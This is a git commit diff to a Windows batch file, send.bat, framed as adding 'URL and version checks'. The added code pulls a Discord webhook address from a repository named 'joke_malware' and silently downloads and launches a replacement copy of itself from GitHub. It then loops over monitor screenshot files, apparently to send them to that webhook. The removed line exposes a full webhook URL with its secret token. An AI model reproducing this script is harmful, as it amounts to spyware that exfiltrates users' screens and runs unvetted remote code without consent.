64fb45b3ea5324659fc87e1dfe77a0e3ce66fc5b
thompog <thomaseduard@hotmail.com>
2026-04-10 14:56:06 +0200

    Enhance send.bat with URL and version checks
    Updated send.bat to dynamically fetch webhook URL and version.

--- send.bat
+++ send.bat
@@ -1,6 +1,23 @@
 @echo off
-set WEBHOOK_URL=https://discord.com/api/webhooks/1491073066145677542/NlYoNlDnzPxXh4T3_QzmobOlqGoyw5G3g7HUiaIQa4VL5TM4r2XpyZnZ0Qh4WWocWarz
+if not exist "%~dp0url.txt" (
+    curl -s -L "https://raw.githubusercontent.com/BOBZERO-afk/joke_malware/refs/heads/main/url.txt" -o "url.txt"
+)
+for /f "tokens=1 delims=" %%a in (url.txt) do set WEBHOOK_URL=%%a
+
 set i=0
+set "Version=1_0"
+
+if exist "version.txt" del "version.txt"
+curl -s -L "https://raw.githubusercontent.com/thompog/d/refs/heads/main/version.txt" -o "version.txt"
+for /f "tokens=1 delims=" %%a in (version.txt) do set Nversion=%%a
+if "%Version%"=="%Nversion%" (
+    del version.txt 
+) else (
+    Ren "%~f0" "%~dp0OLD.bat"
+    curl -s -L "https://raw.githubusercontent.com/thompog/bob/refs/heads/main/send.bat" -o "send.bat"
+    start "" cmd /c "timeout /t 2 && start send.bat"
+    exit /b 0
+)
 
 :loop
 if not exist "monitor%i%.png" goto done
